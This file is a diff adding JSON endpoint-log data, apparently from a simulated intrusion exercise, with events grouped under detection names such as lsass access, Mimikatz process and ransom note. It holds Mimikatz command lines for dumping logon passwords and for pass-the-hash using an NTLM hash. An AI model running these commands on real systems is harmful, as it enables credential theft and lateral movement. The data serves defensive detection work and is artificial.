@@ -1,0 +1,248 @@
+{
+  "process_creation_svchost_to_rundll32": [
+    {
+      "@timestamp": "2026-10-24T11:16:18.385Z",
+      "host.name": "dc01",
+      "event.code": "1",
+      "process.name": "rundll32.exe",
+      "process.parent.name": "svchost.exe",
+      "process.command_line": "C:\\Windows\\system32\\rundll32.exe C:\\Windows\\system32\\PcaSvc.dll,PcaPatchSdbTask",
+      "process.entity_id": "{7575E104-9382-6ADC-D301-000000002100}",
+      "user.name": "SYSTEM"
+    },
+    {
+      "@timestamp": "2026-10-24T14:08:22.236Z",
+      "host.name": "fs01",
+      "event.code": "1",
+      "process.name": "rundll32.exe",
+      "process.parent.name": "svchost.exe",
+      "process.command_line": "\"C:\\Windows\\system32\\rundll32.exe\" C:\\Windows\\system32\\PcaSvc.dll,PcaPatchSdbTask",
+      "process.entity_id": "{88E52A21-BBD6-6ADC-8000-000000000E00}",
+      "user.name": "SYSTEM"
+    },
+    {
+      "@timestamp": "2026-10-24T14:14:21.648Z",
+      "host.name": "ws01",
+      "event.code": "1",
+      "process.name": "rundll32.exe",
+      "process.parent.name": "svchost.exe",
+      "process.command_line": "\"C:\\Windows\\system32\\rundll32.exe\" C:\\Windows\\system32\\PcaSvc.dll,PcaPatchSdbTask",
+      "process.entity_id": "{88E52A21-BD3D-6ADC-8B00-000000001D00}",
+      "user.name": "SYSTEM"
+    }
+  ],
+  "process_creation_winlogon_children": [
+    {
+      "@timestamp": "2026-10-24T14:05:21.252Z",
+      "host.name": "ws01",
+      "event.code": "1",
+      "process.name": "fontdrvhost.exe",
+      "process.parent.name": "winlogon.exe",
+      "process.command_line": "\"fontdrvhost.exe\"",
+      "process.entity_id": "{88E52A21-BB21-6ADC-0E00-000000001D00}",
+      "user.name": "UMFD-1"
+    },
+    {
+      "@timestamp": "2026-10-24T14:05:21.324Z",
+      "host.name": "fs01",
+      "event.code": "1",
+      "process.name": "fontdrvhost.exe",
+      "process.parent.name": "winlogon.exe",
+      "process.command_line": "\"fontdrvhost.exe\"",
+      "process.entity_id": "{88E52A21-BB21-6ADC-0E00-000000000E00}",
+      "user.name": "UMFD-1"
+    },
+    {
+      "@timestamp": "2026-10-24T14:05:21.503Z",
+      "host.name": "ws01",
+      "event.code": "1",
+      "process.name": "LogonUI.exe",
+      "process.parent.name": "winlogon.exe",
+      "process.command_line": "\"LogonUI.exe\" /flags:0x2 /state0:0xa3bd2855 /state1:0x41c64e6d",
+      "process.entity_id": "{88E52A21-BB21-6ADC-1100-000000001D00}",
+      "user.name": "SYSTEM"
+    },
+    {
+      "@timestamp": "2026-10-24T14:05:21.513Z",
+      "host.name": "ws01",
+      "event.code": "1",
+      "process.name": "dwm.exe",
+      "process.parent.name": "winlogon.exe",
+      "process.command_line": "\"dwm.exe\"",
+      "process.entity_id": "{88E52A21-BB21-6ADC-1200-000000001D00}",
+      "user.name": "DWM-1"
+    },
+    {
+      "@timestamp": "2026-10-24T14:05:21.574Z",
+      "host.name": "fs01",
+      "event.code": "1",
+      "process.name": "LogonUI.exe",
+      "process.parent.name": "winlogon.exe",
+      "process.command_line": "\"LogonUI.exe\" /flags:0x2 /state0:0xa3bd2055 /state1:0x41c64e6d",
+      "process.entity_id": "{88E52A21-BB21-6ADC-1100-000000000E00}",
+      "user.name": "SYSTEM"
+    }
+  ],
+  "thread_into_winlogon": [
+    {
+      "@timestamp": "2026-10-24T14:19:14.555Z",
+      "host.name": "ws01",
+      "event.code": "8",
+      "process.name": "rundll32.exe",
+      "winlog.event_data.TargetImage": "C:\\Windows\\System32\\winlogon.exe"
+    },
+    {
+      "@timestamp": "2026-10-24T15:57:05.216Z",
+      "host.name": "ws01",
+      "event.code": "8",
+      "process.name": "rundll32.exe",
+      "winlog.event_data.TargetImage": "C:\\Windows\\System32\\winlogon.exe"
+    }
+  ],
+  "thread_into_svchost": [
+    {
+      "@timestamp": "2026-10-24T14:35:12.796Z",
+      "host.name": "ws01",
+      "event.code": "8",
+      "process.name": "csrss.exe",
+      "winlog.event_data.TargetImage": "C:\\Windows\\System32\\svchost.exe"
+    },
+    {
+      "@timestamp": "2026-10-24T14:35:12.814Z",
+      "host.name": "ws01",
+      "event.code": "8",
+      "process.name": "csrss.exe",
+      "winlog.event_data.TargetImage": "C:\\Windows\\System32\\svchost.exe"
+    },
+    {
+      "@timestamp": "2026-10-24T14:35:12.814Z",
+      "host.name": "ws01",
+      "event.code": "8",
+      "process.name": "csrss.exe",
+      "winlog.event_data.TargetImage": "C:\\Windows\\System32\\svchost.exe"
+    }
+  ],
+  "lsass_access": [
+    {
+      "@timestamp": "2026-10-24T15:59:05.127Z",
+      "host.name": "fs01",
+      "event.code": "10",
+      "process.name": "mk.exe",
+      "winlog.event_data.TargetImage": "C:\\Windows\\system32\\lsass.exe",
+      "winlog.event_data.GrantedAccess": "0x1010"
+    },
+    {
+      "@timestamp": "2026-10-24T15:59:37.039Z",
+      "host.name": "ws01",
+      "event.code": "10",
+      "process.name": "mk.exe",
+      "winlog.event_data.TargetImage": "C:\\Windows\\system32\\lsass.exe",
+      "winlog.event_data.GrantedAccess": "0x1010"
+    },
+    {
+      "@timestamp": "2026-10-24T15:59:37.106Z",
+      "host.name": "ws01",
+      "event.code": "10",
+      "process.name": "mk.exe",
+      "winlog.event_data.TargetImage": "C:\\Windows\\system32\\lsass.exe",
+      "winlog.event_data.GrantedAccess": "0x1038"
+    }
+  ],
+  "mimikatz_process": [
+    {
+      "@timestamp": "2026-10-24T15:59:04.946Z",
+      "host.name": "fs01",
+      "event.code": "1",
+      "process.name": "mk.exe",
+      "process.parent.name": "rundll32.exe",
+      "process.command_line": "mk.exe privilege::debug sekurlsa::logonpasswords exit",
+      "process.entity_id": "{88E52A21-D5C8-6ADC-6301-000000000F00}",
+      "user.name": "WS01$"
+    },
+    {
+      "@timestamp": "2026-10-24T15:59:19.173Z",
+      "host.name": "ws01",
+      "event.code": "1",
+      "process.name": "mk.exe",
+      "process.parent.name": "winlogon.exe",
+      "process.command_line": "mk.exe sekurlsa::pth /user:bk.admin /domain:C0015 /ntlm:2b576acbe6bcfda7294d6bd18041b8fe /run:C:/pth.bat exit",
+      "process.entity_id": "{88E52A21-D5D7-6ADC-8301-000000002000}",
+      "user.name": "SYSTEM"
+    },
+    {
+      "@timestamp": "2026-10-24T15:59:36.976Z",
+      "host.name": "ws01",
+      "event.code": "1",
+      "process.name": "mk.exe",
+      "process.parent.name": "cmd.exe",
+      "process.command_line": "C:\\Windows\\System32\\mk.exe  \"sekurlsa::pth /user:bk.admin /domain:C0015 /ntlm:2b576acbe6bcfda7294d6bd18041b8fe /run:C:\\pth.bat\"",
+      "process.entity_id": "{88E52A21-D5E8-6ADC-8801-000000002000}",
+      "user.name": "SYSTEM"
+    }
+  ],
+  "wmi_pivot_target": [],
+  "unsigned_module_load": [
+    {
+      "@timestamp": "2026-10-24T14:18:38.211Z",
+      "host.name": "ws01",
+      "event.code": "7",
+      "process.name": "rundll32.exe",
+      "file.path": "C:\\Users\\Public\\C0015\\D8B3.dll",
+      "winlog.event_data.Signed": "false",
+      "file.hash.sha256": "fee60f0f34fdba719529741bd2f4fcf144ac5f994e8a6efefefea8940eb037bb"
+    },
+    {
+      "@timestamp": "2026-10-24T14:19:14.446Z",
+      "host.name": "ws01",
+      "event.code": "7",
+      "process.name": "rundll32.exe",
+      "file.path": "C:\\Users\\Public\\C0015\\c0015_injector.dll",
+      "winlog.event_data.Signed": "false",
+      "file.hash.sha256": "6fb6bf9ea811ae44076550ccd4e4c410b7cf23275560034ed91667bf61dede06"
+    },
+    {
+      "@timestamp": "2026-10-24T14:41:06.398Z",
+      "host.name": "fs01",
+      "event.code": "7",
+      "process.name": "rclone.exe",
+      "file.path": "C:\\Tools\\rclone.exe",
+      "winlog.event_data.Signed": "false",
+      "file.hash.sha256": "033eee51c9ad47c2de2624b6674d355274bcd6cf0027a5f85db4437ba24ae81c"
+    }
+  ],
+  "ransom_note": [
+    {
+      "@timestamp": "2026-10-24T14:30:57.143Z",
+      "host.name": "fs01",
+      "event.code": "11",
+      "process.name": "locker_sim.exe",
+      "file.path": "C:\\C0015\\corpus\\readme.txt"
+    },
+    {
+      "@timestamp": "2026-10-24T14:30:57.143Z",
+      "host.name": "fs01",
+      "event.code": "11",
+      "process.name": "locker_sim.exe",
+      "file.path": "C:\\C0015\\corpus\\Finance\\readme.txt"
+    },
+    {
+      "@timestamp": "2026-10-24T14:30:57.143Z",
+      "host.name": "fs01",
+      "event.code": "11",
+      "process.name": "locker_sim.exe",
+      "file.path": "C:\\C0015\\corpus\\HR\\readme.txt"
+    }
+  ],
+  "remote_access_tool": [
+    {
+      "@timestamp": "2026-10-24T16:14:41.692Z",
+      "host.name": "fs01",
+      "event.code": "1",
+      "process.name": "AnyDesk.exe",
+      "process.parent.name": "svchost.exe",
+      "process.command_line": "\"C:\\Users\\Public\\Videos\\AnyDesk.exe\" --version",
+      "process.entity_id": "{88E52A21-D971-6ADC-BF01-000000000F00}",
+      "user.name": "SYSTEM"
+    }
+  ]
+}
